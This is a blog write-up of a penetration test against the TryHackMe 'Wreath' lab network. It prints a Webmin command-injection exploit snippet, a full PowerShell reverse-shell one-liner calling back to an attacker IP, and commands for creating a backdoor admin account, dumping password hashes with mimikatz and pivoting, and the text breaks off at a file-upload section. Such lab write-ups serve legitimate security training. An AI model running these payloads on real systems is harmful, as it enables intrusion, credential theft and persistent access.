<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Wreath Network" /><meta name="author" content="L15t3Nr" /><meta property="og:locale" content="en" /><meta name="description" content="I am L15t3Nr, a seeker of arcane knowledge in the eldritch realms of cyberspace." /><meta property="og:description" content="I am L15t3Nr, a seeker of arcane knowledge in the eldritch realms of cyberspace." /><link rel="canonical" href="https://l15t3nr.github.io/posts/Wreath-Network-Write-up/" /><meta property="og:url" content="https://l15t3nr.github.io/posts/Wreath-Network-Write-up/" /><meta property="og:site_name" content="L15t3Nr" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-07-09T17:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Wreath Network" /><meta name="twitter:site" content="@L15t3Nr" /><meta name="twitter:creator" content="@L15t3Nr" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"L15t3Nr"},"dateModified":"2025-04-28T19:08:55+00:00","datePublished":"2022-07-09T17:00:00+00:00","description":"I am L15t3Nr, a seeker of arcane knowledge in the eldritch realms of cyberspace.","headline":"Wreath Network","mainEntityOfPage":{"@type":"WebPage","@id":"https://l15t3nr.github.io/posts/Wreath-Network-Write-up/"},"url":"https://l15t3nr.github.io/posts/Wreath-Network-Write-up/"}</script><title>Wreath Network | L15t3Nr</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="L15t3Nr"><meta name="application-name" content="L15t3Nr"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/Avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">L15t3Nr</a></div><div class="site-subtitle font-italic">InfoSec Acolyte</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/L15t3Nr" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/L15t3Nr" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['l15t3nr','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Wreath Network</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Wreath Network</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1657386000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jul 9, 2022 </em> </span> <span> Updated <em class="" data-ts="1745867335" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Apr 28, 2025 </em> </span><div class="d-flex justify-content-between"> <span> By <em> L15t3Nr </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3318 words"> <em>18 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="//assets/img/wreath-writeup/wreath-network.png" alt="wreth-network" data-proofer-ignore></p><p>The Wreath Network can be found <a href="https://tryhackme.com/room/wreath">here</a></p><h1 id="executive-summary">Executive Summary</h1><p>The penetration test was performed at the request of the client, Thomas Wreath. The client provided details of the network prior to the test. There are three machines on the network, one of which is public facing. There is a self-hosted git server and a PC with an antivirus installed.</p><p>Out-of-date software resulted in the immediate rooting of two out of the three computers. Insecure code in an image upload resulted in gaining access to the third computer.</p><h1 id="attack-narrative">Attack Narrative</h1><h2 id="production-server-200"><span class="mr-2">Production Server (.200)</span><a href="#production-server-200" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The first target IP was given by the client.</p><h3 id="nmap"><span class="mr-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The first scan creates a list of open ports on the target machine. <code class="language-plaintext highlighter-rouge">nmap -p 1-15000 -iL IP -oN enum/all -vvv --open</code> There are responses from ports <strong>22</strong>, <strong>80</strong>, <strong>443</strong>, and <strong>10000</strong>. The next step is to enumerate the services and their versions. <code class="language-plaintext highlighter-rouge">nmap -p 22,80,443,10000 -sC -sV -vvv -iL IP -oN enum/scan</code> The results of the scan with some information omitted:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>22/tcp open ssh syn-ack OpenSSH 8.0 (protocol 2.0)
80/tcp open http syn-ack Apache httpd 2.4.37 ((centos)
OpenSSL/1.1.1c)
|_http-title: Did not follow redirect to
https://thomaswreath.thm"&gt;&lt;strong&gt;https://thomaswreath.thm
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
443/tcp open ssl/http syn-ack Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-title: Thomas Wreath | Developer
| ssl-cert: Subject:
commonName=thomaswreath.thm organizationName=Thomas
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
10000/tcp open http syn-ack MiniServ 1.890 (Webmin httpd)
</pre></table></code></div></div><p>There is a redirect attempt to <a href="https://thomaswreath.thm"><strong>https://thomaswreath.thm</strong></a>, so, the hostname â€œ<strong>thomaswreath.thm</strong>â€ was added to the <strong>/etc/hosts</strong> file to map the IP address to this hostname.</p><p><strong>CVE-2019-15107</strong></p><p>Investigating known exploits for each of these services, it was discovered that <strong>MiniServ 1.890</strong> is vulnerable to a command injection vulnerability: <a href="https://nvd.nist.gov/vuln/detail/cve-2019-15107"><strong>CVE-2019-15107</strong></a> Exploit proof-of-concept code in python is found <a href="https://raw.githubusercontent.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/master/webmin-1.890_exploit.py&gt;">here</a> (Credits to <strong>foxsin32</strong> for sharing their PoC)</p><h3 id="post-exploitation"><span class="mr-2">Post-Exploitation</span><a href="#post-exploitation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The exploit takes advantage of a bad check of the â€˜pamâ€™ parameter to execute commands as root.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>def exploit(target, port, url, command):
header = 'Referer: )
payload = 'user=gotroot&amp;amp;pam=&amp;amp;expired=2|echo "";{}'.format(command)
os.system("curl -k {} -d '{}' -H '{}'".format(url,payload,header))
</pre></table></code></div></div><p>â€˜pamâ€™ is left blank.</p><p>Using this functionality, the private SSH key can be found in <strong>/root/.ssh/id_rsa</strong></p><p><img data-src="//assets/img/wreath-writeup/id_rsa.png" alt="exploit" data-proofer-ignore></p><p>The private key provides access to the production server as <strong>root</strong> via SSH.</p><p><img data-src="//assets/img/wreath-writeup/ssh.png" alt="ssh" data-proofer-ignore></p><h3 id="post-enumeration"><span class="mr-2">Post-Enumeration</span><a href="#post-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The next step is to search for other hosts on the network that are only reachable by the production server. Downloading a static binary of Nmap onto the host by starting a simple python server on the attack machine in the directory with the static binary and using the curl command to fetch the file from the compromised host wonâ€™t be a problem because the /tmp directory doesnâ€™t write to disk.</p><p><img data-src="//assets/img/wreath-writeup/curlCommand.png" alt="curlCommand" data-proofer-ignore></p><p><img data-src="//assets/img/wreath-writeup/nmapBinary.png" alt="nmapBinary" data-proofer-ignore></p><p>Once the static binary is marked as executable, a simple Nmap scan with the â€“<strong>sn</strong> flag will determine which hosts are alive on the network.</p><p><img data-src="//assets/img/wreath-writeup/nmap_hosts.png" alt="nmap_hosts" data-proofer-ignore></p><p>The hosts at .250 and .1 are both out of scope and .200 is the compromised machine currently being worked from, so that leaves .<strong>150</strong> and .<strong>100</strong> to further enumerate for services. The two IP addresses are placed into a file and are imported in Nmap with the <strong>â€“iL</strong> flag.</p><p><img data-src="//assets/img/wreath-writeup/nmap_service.png" alt="nmap_service" data-proofer-ignore></p><p>There is no response from .100, but .150 has a few ports open. Port 80 will be manually inspected; however, a proxy is needed in order to access the webpage.</p><h3 id="command-and-control-with-empire"><span class="mr-2">Command and Control with Empire</span><a href="#command-and-control-with-empire" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Since the plan is to compromise another host on the network, it will be beneficial to get a C2 (command and control) server setup. I have chosen the PowerShell Empire and will be jumping between Empire, SSH, and evil-winrm to accomplish tasks.</p><p>First the PowerShell Empire server must be started.</p><p><img data-src="//assets/img/wreath-writeup/Empire-Server.png" alt="empire-server" data-proofer-ignore></p><p>Then connect to the server with the PowerShell Empire client.</p><p><img data-src="//assets/img/wreath-writeup/Empire-Client.png" alt="empire-client" data-proofer-ignore></p><p>Two listeners are created but only one will be used for now, HTTP-L15t3Nr. The other listener will be used later for a jump server.</p><p><img data-src="//assets/img/wreath-writeup/listeners.png" alt="listeners" data-proofer-ignore></p><p>Next, I will need a bash stager to connect to the C2, which will get an agent started on the target. The agent will remain on the target as a reverse shell. The stager I use is the <strong>multi/bash</strong> stager and I set its listener to <strong>HTTP-L15t3Nr.</strong> Then I <strong>execute</strong> the stager, and a payload is given. This payload will be copied and pasted into our SSH session, and an agent will spawn a shell.</p><p><img data-src="//assets/img/wreath-writeup/stagerPAyload.png" alt="stagerPayload" data-proofer-ignore></p><p><img data-src="//assets/img/wreath-writeup/C2Connection1.png" alt="C2Connection1" data-proofer-ignore></p><h3 id="pivoting-via-sshuttle"><span class="mr-2">Pivoting via SSHuttle</span><a href="#pivoting-via-sshuttle" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Since our attack machine isnâ€™t permitted to access the internal network, I will need to pivot using the compromised production server to access the next webpage. This can be achieved using a tool called SSHuttle.</p><p><code class="language-plaintext highlighter-rouge">sshuttle -r root@10.200.73.200 --ssh-cmd "ssh -i id_rsa" 10.200.73.0/24 -x 10.200.73.200</code></p><p>With this command I set the remote flag with <strong>â€“r</strong> and specify the root user at the target IP address, then I use the â€“<strong>ssh-cmd</strong> flag to include (<strong>-i)</strong> the id_rsa file, the final field sets the network being proxied to and to not include the remote targets address with <strong>â€“x.</strong></p><p>We can now type in the .150 target IP address into the browser and visit the webpage.</p><h2 id="gitstack-server-150"><span class="mr-2">GitStack Server (.150)</span><a href="#gitstack-server-150" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="manual-inspection"><span class="mr-2">Manual Inspection</span><a href="#manual-inspection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The first thing I see is a 404 page with some directory information.</p><p><img data-src="//assets/img/wreath-writeup/404.png" alt="404" data-proofer-ignore></p><p>Upon visiting the /registration/login page, I get a login page with a note about default credentials. Trying these credentials results in nothing.</p><p><img data-src="//assets/img/wreath-writeup/gitstack.png" alt="GitStack" data-proofer-ignore></p><p><strong>Exploitation</strong></p><p>We do, however, get a service called GitStack. Using searchsploit results in a few known exploits for GitStack. After examining each of these exploits it is the exploit for 2.3.10 that I will try.</p><p><img data-src="//assets/img/wreath-writeup/searchsploit.png" alt="//assets/img/wreath-writeup/searchsploit.png" data-proofer-ignore></p><p>This exploit requires a bit of modification in order to get it working the way I want.</p><p>First set the targets IP addresses to the variable â€˜ipâ€™</p><p><img data-src="//assets/img/wreath-writeup/modification1.png" alt="alt-1" data-proofer-ignore></p><p>Then adjust the filename that the payload will be called.</p><p><img data-src="//assets/img/wreath-writeup/modification2.png" alt="alt-2" data-proofer-ignore></p><p>This exploit will create a backdoor to execute remote commands and later it will be used to trigger a full reverse shell on the target machine.</p><p><img data-src="//assets/img/wreath-writeup/exploit2.png" alt="alt-3" data-proofer-ignore></p><p>This uploads the backdoor to the target and triggers the â€˜whoamiâ€™ command. I can see that I am NT <strong>AUTHORITY\SYSTEM</strong>, which is like having root on a Linux machine, but on Windows.</p><p>With the backdoor uploaded, I can send a post request to the malicious file from now on and place whatever payload I like into the â€˜a=â€™ parameter.</p><p><img data-src="//assets/img/wreath-writeup/post_requests.png" alt="alt-4" data-proofer-ignore></p><h3 id="firewall"><span class="mr-2">Firewall</span><a href="#firewall" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Now to elevate to a full reverse shell. First, I must determine if the target machine is able to connect back to the attack machine through the production server. While I can establish a connection to the web page through SSHuttle on port 22, I likely wonâ€™t be able to get a reverse shell without punching a hole in the firewall.</p><p>To check, I will send a ping command to the attack machine from the compromised target and listen for ICMP requests using TCPdump.</p><p><img data-src="//assets/img/wreath-writeup/tcpPing.png" alt="alt-5" data-proofer-ignore></p><p>Each of the ICMP requests failed and TCPdump didnâ€™t receive anything.</p><p><img data-src="//assets/img/wreath-writeup/tcpDump.png" alt="alt-6" data-proofer-ignore></p><p>This means I will have to open a port in the firewall on the production server in order to get a connection between the GitServer and the attack machine.</p><p><img data-src="//assets/img/wreath-writeup/firewall-cmd.png" alt="alt-7" data-proofer-ignore></p><p><strong>Jump Server and Hop Listener</strong></p><p>Unfortunately, that is not enough to get the reverse shell if I want to use Empire. Empire agents canâ€™t be proxied, so I must also set up a â€œjumpâ€ server on the production server. This jump server will listen for the GitServers stager Iâ€™m about to send and forward its traffic to a local HTTP_Hop listener in empire. The hop listener will then redirect traffic to the main http listener.</p><p>First, I created the Hop_Listener</p><p><img data-src="//assets/img/wreath-writeup/http_hop_listener.png" alt="alt-8" data-proofer-ignore></p><p>Then specify the <strong>Host</strong> as the Production Server IP address. I set the <strong>Port</strong> to the port I just opened on the Production Server, <strong>23598</strong>. Then I set the <strong>RedirectListener</strong> to the main listener, <strong>HTTP-L15t3Nr</strong>.</p><p>Executing this listener writes some files into the <strong>/tmp/http_hop</strong> folder on the attack machine. This entire directory will be sent over to the Production Server in the <strong>/tmp/http_hop</strong> folder. With these files in place, I will start the PHP server by running this command in the <strong>http_hop</strong> folder.</p><p><code class="language-plaintext highlighter-rouge">php â€“S 0.0.0.0:23597 &amp;\&gt;/dev/null &amp;</code></p><p><img data-src="//assets/img/wreath-writeup/http_hop.png" alt="alt-9" data-proofer-ignore></p><h3 id="launcher-stager"><span class="mr-2">Launcher Stager</span><a href="#launcher-stager" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>With the listener listening and the jump server started, I can create a PowerShell launcher that connects to the jump server and then to the C2. Iâ€™m using the <strong>multi/launcher</strong> stager here and setting the <strong>Listener</strong> to be <strong>http_hop</strong>.</p><p><img data-src="//assets/img/wreath-writeup/multi_stager.png" alt="alt-10" data-proofer-ignore></p><p><img data-src="//assets/img/wreath-writeup/launcher_stager.png" alt="alt-11" data-proofer-ignore></p><h3 id="preparing-for-transport"><span class="mr-2">Preparing for Transport</span><a href="#preparing-for-transport" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Executing the launcher stager generates a PowerShell script. This script will be prepared for transport by URL encoding it.</p><p><img data-src="//assets/img/wreath-writeup/stager_encode.png" alt="alt-12" data-proofer-ignore></p><h3 id="sending-the-payload"><span class="mr-2">Sending the Payload</span><a href="#sending-the-payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>With the payload now URL encoded, I send it using the post request method with curl. <img data-src="//assets/img/wreath-writeup/sendingStager.png" alt="alt-13" data-proofer-ignore></p><p>Now I have got a new agent in the C2 to do further enumeration on.</p><p><img data-src="//assets/img/wreath-writeup/C2Connection2.png" alt="alt-14" data-proofer-ignore></p><p>Since Iâ€™m still learning how to effectively use Empire, Iâ€™ll also get a classic reverse shell with netcat by sending the following payload after its URL encoded. This will require a static binary of netcat on the Production Server to catch the reverse shell. Once I have the static binary on the server, I start the listener and send the payload:</p><p><code class="language-plaintext highlighter-rouge">powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();\[byte\[\]\]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\&gt;&amp;1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '\&gt; ';$sendbyte = (\[text.encoding\]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"</code></p><p><img data-src="//assets/img/wreath-writeup/Pwr_to_nc.png" alt="alt-15" data-proofer-ignore></p><p><img data-src="//assets/img/wreath-writeup/netCat.png" alt="alt-16" data-proofer-ignore></p><h3 id="post-exploitation-1"><span class="mr-2">Post-Exploitation</span><a href="#post-exploitation-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Due to having access to the GitServer as NT AUTHORITY\SYSTEM, there is no need to escalate privileges.</p><p><img data-src="//assets/img/wreath-writeup/nmap_service.png" alt="alt-17" data-proofer-ignore></p><p>From the earlier port scan, <strong>3389</strong> and <strong>5985</strong> are also open. 3389 is used to enable users to access remote computers and 5985 is the default port for Windows Remote Management. I find evil-winrm to be easier and more stable than a simple netcat shell, so I will need to create a new account in the Administrators group since I donâ€™t have credentials.</p><p>In an interactive shell through netcat, the command to add a user is:</p><p><code class="language-plaintext highlighter-rouge">net user l15t3nr l15t3nr /add</code></p><p>Then the new user must be added to the Administrators and â€œRemote Management Usersâ€ groups</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>net localgroup Administrators l15t3nr /add
net localgroup â€œRemote Management Usersâ€ l15t3nr /add
</pre></table></code></div></div><p><img data-src="//assets/img/wreath-writeup/user_add.png" alt="alt-18" data-proofer-ignore></p><p>Now I can connect to a remote management shell with evil-winrm</p><p><code class="language-plaintext highlighter-rouge">evil-winrm â€“u l15t3nr â€“p l15t3nr -i 10.200.73.150</code></p><p><img data-src="//assets/img/wreath-writeup/evil-winrm-l15t3nr.png" alt="alt-19" data-proofer-ignore></p><p>Next, Iâ€™ll be connecting with RDP to get an interactive GUI session and sharing the resource to mimikatz in order to use the tool.</p><p><code class="language-plaintext highlighter-rouge">xfreerdp /v:10.200.73.150 /u:l15t3nr /p:l15t3nr +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share</code></p><p><img data-src="//assets/img/wreath-writeup/RDP.png" alt="alt-20" data-proofer-ignore></p><p>Running the following command in an administrative command prompt will start mimikatz.</p><p><code class="language-plaintext highlighter-rouge">\\tsclient\share\mimikatz\x64\mimikatz.exe</code></p><p>Next, I give myself debug privileges and elevate the integrity to SYSTEM level.</p><p><img data-src="//assets/img/wreath-writeup/mimikatz1.png" alt="alt-21" data-proofer-ignore></p><p>Now, I will dump all the SAM local password hashes:</p><p><img data-src="//assets/img/wreath-writeup/AdministratorHash.png" alt="alt-22" data-proofer-ignore></p><p>With the Administrator hash I can pass-the-hash using evil-winrm and login as the administrator.</p><p><img data-src="//assets/img/wreath-writeup/evil-Admin.png" alt="alt-23" data-proofer-ignore></p><h3 id="post-enumeration-1"><span class="mr-2"><strong>Post-Enumeration</strong></span><a href="#post-enumeration-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Since Iâ€™m not completely concerned with OPSEC safe tools, Iâ€™m going to use the <strong>powershell/situational_awareness/network/portscan</strong> module in Empire to enumerate the host that didnâ€™t respond to the Production Server; <strong>.100.</strong> This tool does write to disk, so it could be detected by AV/EDR if thatâ€™s running on the system. If youâ€™re reading this and you know of a better way to enumerate ports without touching disk or triggering AV/EDR, please let me know on Twitter <strong>@L15t3Nr</strong>.</p><p><img data-src="//assets/img/wreath-writeup/Pwr_Port_Scan.png" alt="alt-24" data-proofer-ignore></p><p>The <strong>Hosts</strong> are set to the IP address and the ports are left default. The <strong>Agent</strong> is set to the GitServerâ€™s agent. Executing the module initiates the PowerShell script and it returns some interesting information.</p><p><img data-src="//assets/img/wreath-writeup/Pwr_Port_Scan_Result.png" alt="alt-25" data-proofer-ignore></p><p>Ports <strong>80</strong> and <strong>3389</strong> are open.</p><h3 id="pivoting"><span class="mr-2">Pivoting</span><a href="#pivoting" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Like before, accessing the webpage on port <strong>80</strong> wonâ€™t be possible from the attack machine without setting up another proxy or relay and punching a hole through the GitServerâ€™s <strong>firewall</strong>. One option for this is using <strong>Chisel</strong> to establish a client/server relationship between the attack machine and the GitServer, enabling access to the final node in the network.</p><p>I open port <strong>23600</strong> on the GitServer.</p><p>Fetching a static binary of Chisel is simple enough. Evil-winrm has a convenient <strong>upload</strong> feature that allows me to upload tools to the target.</p><p><img data-src="//assets/img/wreath-writeup/firewall-chisel.png" alt="alt-26" data-proofer-ignore></p><p>I start the chisel server on port 23600 set port 9090 as the proxy port.</p><p><img data-src="//assets/img/wreath-writeup/chisel-server.png" alt="alt-27" data-proofer-ignore></p><p>The chisel client connects to the server on port 23600 and uses the proxy port of 9090. Iâ€™m using foxyproxy in my browser to navigate to the remote webpage.</p><p><img data-src="//assets/img/wreath-writeup/chisel-client.png" alt="alt-28" data-proofer-ignore></p><h2 id="wreath-pc-100"><span class="mr-2">Wreath PC (.100)</span><a href="#wreath-pc-100" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><span id="_Toc88927060" class="anchor"></span><strong>Repository</strong></p><p>The website is a clone of the Gitserverâ€™s webpage and itâ€™s running php 7.4.11</p><p><img data-src="//assets/img/wreath-writeup/Wreath-PC-webpage.png" alt="alt-29" data-proofer-ignore></p><p>The GitStack directory is worth exploring since it has more details about the backend.</p><p><img data-src="//assets/img/wreath-writeup/gitstack-dir.png" alt="alt-30" data-proofer-ignore></p><p>Thereâ€™s an interesting git directory that Iâ€™ll download and inspect locally.</p><p><img data-src="//assets/img/wreath-writeup/Gitstack-dir2.png" alt="alt-31" data-proofer-ignore></p><p><span id="_Toc1262132117" class="anchor"></span><strong>Commits</strong></p><p>The directory is a repository, so I will rename it as â€˜<strong>.gitâ€™</strong> to be able to interact with it using <strong>GitTools</strong>.</p><p>GitTools will help me extract information from the repository, so I will clone it with:</p><p><code class="language-plaintext highlighter-rouge">Git clone https://github.com/internetwache/GitTools</code></p><p>Now, Iâ€™ll run the GitTools extractor in the same directory as â€˜.gitâ€™ and it creates a new directory called <strong>Website</strong>.</p><p><img data-src="//assets/img/wreath-writeup/extractor.png" alt="alt-32" data-proofer-ignore></p><p>This directory contains commits and identifying the order of these commits will help me pinpoint the most recent commit in hopes that it will uncover a bleeding edge feature on the website which could be vulnerable.</p><p>Each commit has a â€˜commit-meta.txtâ€™ that I can use to get the order. I enter the â€˜<strong>Website</strong>â€™ directory and cat out each of the commit-meta.txt files in each directory.</p><p><img data-src="//assets/img/wreath-writeup/commit-meta.png" alt="alt-33" data-proofer-ignore></p><p>The first commit is easy to find as it has no parent commit and corresponds to â€˜0-â€™. The next commit in order is â€˜2-â€™ as it has a parent commit of â€˜0-â€™, and finally â€˜1-â€™ is the most recent commit as it has a parent commit of â€˜2-â€™.</p><p>The commit order is:</p><ol><li><p>70dde80cc19ec76704567996738894828f4ee895 (â€˜0-â€™)</p><li><p>82dfc97bec0d7582d485d9031c09abcb5c6b18f2 (â€˜2-â€™)</p><li><p>345ac8b236064b431fa43f53d91c98c4834ef8f3 (â€˜1-â€™)</p></ol><h3 id="file-upload"><span class="mr-2">File Upload</span><a href="#file-upload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Within the â€˜1-â€™ directory is the most up-to-date version of the website, and it happens to contain an upload feature in â€˜<strong>resources/index.php</strong>â€™</p><p><img data-src="//assets/img/wreath-writeup/resources-index.png" alt="alt-34" data-proofer-ignore></p><p>I 